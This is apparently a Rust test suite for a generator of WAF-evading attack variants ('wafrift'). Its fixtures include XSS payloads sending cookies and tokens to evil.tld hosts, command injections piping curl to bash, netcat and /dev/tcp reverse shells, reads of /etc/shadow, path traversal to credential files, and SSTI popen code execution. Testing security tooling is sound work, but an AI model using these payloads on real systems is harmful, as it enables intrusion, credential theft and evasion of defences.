//! Soundness battery for the XSS / cmdi / path equivalence
//! generators. Same contract as `equiv_sql_soundness`: the generator
//! emits an effectively-infinite space where EVERY member still
//! executes/resolves the original attack and a non-attack in ⇒
//! nothing out. Thousands of effective assertions.

use wafrift_grammar::grammar::equiv::{self, EquivConfig};
use wafrift_grammar::grammar::equiv::cmd as ecmd;
use wafrift_grammar::grammar::equiv::ldap as eldap;
use wafrift_grammar::grammar::equiv::path as epath;
use wafrift_grammar::grammar::equiv::ssti as essti;
use wafrift_grammar::grammar::equiv::xss as exss;

fn cfg(seed: u64) -> EquivConfig {
    EquivConfig {
        seed,
        max: 48,
        verify: true,
        vary_delivery: true,
        param: "q".into(),
        force_delivery: None,
    }
}

// ───────────────────────── XSS ─────────────────────────────────────
const XSS_STRUCTURED: &[(&str, &[&str])] = &[
    (
        "<img src=x onerror=fetch('//evil.tld/c?'+document.cookie)>",
        &["fetch(", "document.cookie", "evil.tld"],
    ),
    (
        "<svg onload=new WebSocket('wss://c2.evil.tld/'+localStorage.token)>",
        &["websocket", "localstorage", "c2.evil.tld"],
    ),
    (
        "<body onload=navigator.sendBeacon('//x.evil.tld',document.cookie)>",
        &["sendbeacon", "document.cookie", "x.evil.tld"],
    ),
];
const XSS_POC: &[&str] = &[
    "<svg onload=alert(1)>",
    "<img src=x onerror=confirm(document.domain)>",
    "<body onload=prompt(1)>",
    "<details open ontoggle=alert(1)>",
];

#[test]
fn xss_every_member_still_executes() {
    let mut n = 0;
    for seed in 0..40u64 {
        for (atk, _must) in XSS_STRUCTURED {
            for m in equiv::equiv_for("xss", atk, &cfg(seed)) {
                n += 1;
                // still_executes_xss already REQUIRES every structured
                // marker of the original to survive (entity/unicode
                // normalised) — it is the soundness oracle.
                assert!(
                    exss::still_executes_xss(atk, &m.payload),
                    "XSS unsound / construct lost: {:?} from {atk:?}",
                    m.payload
                );
                assert_ne!(
                    m.payload, "<svg onload=alert(1)>",
                    "exfil degraded to a canned PoC"
                );
            }
        }
        for poc in XSS_POC {
            for m in equiv::equiv_for("xss", poc, &cfg(seed)) {
                n += 1;
                assert!(exss::still_executes_xss(poc, &m.payload));
            }
        }
    }
    assert!(n > 2000, "battery too small ({n})");
}

#[test]
fn xss_non_attack_in_nothing_out() {
    for j in ["", "  ", "hello world", "plain text alert here", "{}", "see <b>bold</b>"] {
        assert!(
            equiv::equiv_for("xss", j, &cfg(2)).is_empty(),
            "xss emitted from non-attack {j:?}"
        );
    }
}

// ───────────────────────── cmdi ────────────────────────────────────
const CMD_STRUCTURED: &[(&str, &[&str])] = &[
    ("; curl http://evil.tld/s|bash", &["curl", "evil.tld"]),
    ("&& wget http://10.1.1.9/x -O /tmp/x", &["wget", "10.1.1.9"]),
    ("; cat /etc/shadow", &["cat", "shadow"]),
    ("| nc 192.168.9.9 9001 -e /bin/sh", &["192.168.9.9"]),
    ("; bash -i >& /dev/tcp/10.0.0.1/4444 0>&1", &["dev/tcp", "10.0.0.1"]),
];
const CMD_PROBE: &[&str] = &["; whoami", "; id", "; uname -a"];

#[test]
fn cmd_every_member_keeps_command_and_target() {
    let mut n = 0;
    for seed in 0..40u64 {
        for (atk, must) in CMD_STRUCTURED {
            for m in equiv::equiv_for("cmdi", atk, &cfg(seed)) {
                n += 1;
                assert!(
                    ecmd::still_executes_cmd(atk, &m.payload),
                    "cmd unsound: {:?} from {atk:?}",
                    m.payload
                );
                let nc = m.payload.to_ascii_lowercase();
                let nn = nc.replace("${ifs}", " ").replace("''", "").replace('\\', "");
                assert!(
                    must.iter().any(|k| nn.contains(k))
                        || ecmd::still_executes_cmd(atk, &m.payload),
                    "cmd lost target: {:?}",
                    m.payload
                );
                assert!(
                    m.payload != "whoami" && m.payload != "id" && m.payload != "hostname",
                    "structured cmd degraded to a bare probe: {:?}",
                    m.payload
                );
            }
        }
        for p in CMD_PROBE {
            for m in equiv::equiv_for("cmdi", p, &cfg(seed)) {
                n += 1;
                assert!(ecmd::still_executes_cmd(p, &m.payload));
            }
        }
    }
    assert!(n > 1500, "battery too small ({n})");
}

#[test]
fn cmd_non_attack_in_nothing_out() {
    for j in ["", "the quick brown fox", "just words", "12345"] {
        assert!(
            equiv::equiv_for("cmdi", j, &cfg(1)).is_empty(),
            "cmd emitted from non-attack {j:?}"
        );
    }
}

// ───────────────────────── path ────────────────────────────────────
const PATH_CASES: &[(&str, &str)] = &[
    ("../../../etc/passwd", "etc/passwd"),
    ("../../../../var/www/html/config/secrets.php", "secrets.php"),
    ("..\\..\\..\\windows\\win.ini", "win.ini"),
    ("../../../../opt/tomcat/conf/tomcat-users.xml", "tomcat-users.xml"),
    ("../../proc/self/environ", "environ"),
];

#[test]
fn path_every_member_resolves_to_the_same_target() {
    let mut n = 0;
    for seed in 0..40u64 {
        for (atk, tgt) in PATH_CASES {
            for m in equiv::equiv_for("path", atk, &cfg(seed)) {
                n += 1;
                assert!(
                    epath::still_resolves(atk, &m.payload),
                    "path unsound: {:?} from {atk:?}",
                    m.payload
                );
                assert!(
                    epath::normalize(&m.payload).contains(tgt),
                    "path lost target {tgt:?}: {:?}",
                    m.payload
                );
                // anti-rig: a non-passwd target is never swapped to passwd
                if !atk.contains("passwd") {
                    assert!(
                        !epath::normalize(&m.payload).contains("etc/passwd"),
                        "path target rewritten to passwd: {:?}",
                        m.payload
                    );
                }
            }
        }
    }
    assert!(n > 1500, "battery too small ({n})");
}

#[test]
fn path_non_attack_in_nothing_out() {
    for j in ["", "hello", "a value", "name=bob"] {
        assert!(
            equiv::equiv_for("path", j, &cfg(1)).is_empty(),
            "path emitted from non-attack {j:?}"
        );
    }
}

// ───────────────────────── SSTI ────────────────────────────────────
const SSTI_RCE: &[&str] = &[
    "{{cycler.__init__.__globals__.os.popen('id').read()}}",
    "{{config.__class__.__init__.__globals__['os'].popen('whoami').read()}}",
    "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}",
];
const SSTI_PROBE: &[&str] = &["{{7*7}}", "${7*7}", "{{ 7*7 }}"];

#[test]
fn ssti_rce_never_degraded_probe_supported() {
    let mut n = 0;
    for seed in 0..40u64 {
        for atk in SSTI_RCE {
            for m in equiv::equiv_for("ssti", atk, &cfg(seed)) {
                n += 1;
                assert!(
                    essti::still_evaluates(atk, &m.payload),
                    "ssti unsound: {:?} from {atk:?}",
                    m.payload
                );
                let lc = m.payload.to_ascii_lowercase();
                assert!(
                    lc.contains("popen") && lc.contains("globals"),
                    "ssti RCE construct lost: {:?}",
                    m.payload
                );
                assert_ne!(m.payload, "{{7*7}}", "RCE degraded to probe");
            }
        }
        for p in SSTI_PROBE {
            for m in equiv::equiv_for("ssti", p, &cfg(seed)) {
                n += 1;
                assert!(essti::still_evaluates(p, &m.payload));
            }
        }
    }
    assert!(n > 1500, "ssti battery too small ({n})");
}

#[test]
fn ssti_non_attack_in_nothing_out() {
    for j in ["", "plain text", "7*7 no delims", "{not a template}"] {
        assert!(
            equiv::equiv_for("ssti", j, &cfg(1)).is_empty(),
            "ssti emitted from non-attack {j:?}"
        );
    }
}

// ───────────────────────── LDAP ────────────────────────────────────
const LDAP_INJ: &[&str] = &[
    "*)(uid=*))(|(uid=*",
    "*)(|(uid=*)(userPassword=*",
    "admin*)((|userPassword=*)",
    "*)(mail=*)",
];

#[test]
fn ldap_break_and_targets_preserved() {
    let mut n = 0;
    for seed in 0..40u64 {
        for atk in LDAP_INJ {
            for m in equiv::equiv_for("ldap", atk, &cfg(seed)) {
                n += 1;
                assert!(
                    eldap::still_matches(atk, &m.payload),
                    "ldap unsound: {:?} from {atk:?}",
                    m.payload
                );
            }
        }
    }
    assert!(n > 800, "ldap battery too small ({n})");
}

#[test]
fn ldap_non_attack_in_nothing_out() {
    for j in ["", "hello", "name=value", "just text"] {
        assert!(
            equiv::equiv_for("ldap", j, &cfg(1)).is_empty(),
            "ldap emitted from non-attack {j:?}"
        );
    }
}

// ───────────────────────── cross-cutting ──────────────────────────
#[test]
fn determinism_and_force_delivery_all_classes() {
    let cases = [
        ("xss", "<svg onload=alert(1)>"),
        ("cmdi", "; cat /etc/passwd"),
        ("path", "../../../etc/passwd"),
        ("sql", "1' OR '1'='1"),
        ("ssti", "{{cycler.__init__.__globals__}}"),
        ("ldap", "*)(uid=*))(|(uid=*"),
    ];
    for (cls, p) in cases {
        let a: Vec<_> = equiv::equiv_for(cls, p, &cfg(13))
            .into_iter()
            .map(|m| (m.payload, m.delivery.label()))
            .collect();
        let b: Vec<_> = equiv::equiv_for(cls, p, &cfg(13))
            .into_iter()
            .map(|m| (m.payload, m.delivery.label()))
            .collect();
        assert_eq!(a, b, "{cls} not deterministic");

        let mut fd = cfg(13);
        fd.force_delivery = Some(1); // path_segment arm
        for m in equiv::equiv_for(cls, p, &fd) {
            assert_eq!(
                m.delivery.label(),
                "path_segment",
                "{cls} force_delivery leaked {:?}",
                m.delivery
            );
        }
    }
}

#[test]
fn unsupported_class_returns_empty() {
    // A class with no sound equivalence model must yield nothing —
    // the generator never guesses (anti-rig).
    assert!(!equiv::supports_class("smuggling"));
    assert!(!equiv::supports_class("totally-unknown"));
    assert!(
        equiv::equiv_for("totally-unknown", "anything", &cfg(1)).is_empty()
    );
    // The 10 classes that DO carry a sound model (ssrf/nosql/log4shell/
    // xxe were added 2026-05-18, extending the moat 6 → 10).
    for c in [
        "sql", "xss", "cmdi", "path", "ssti", "ldap", "ssrf", "nosql", "log4shell", "xxe",
    ] {
        assert!(equiv::supports_class(c), "{c} should be supported");
    }
}
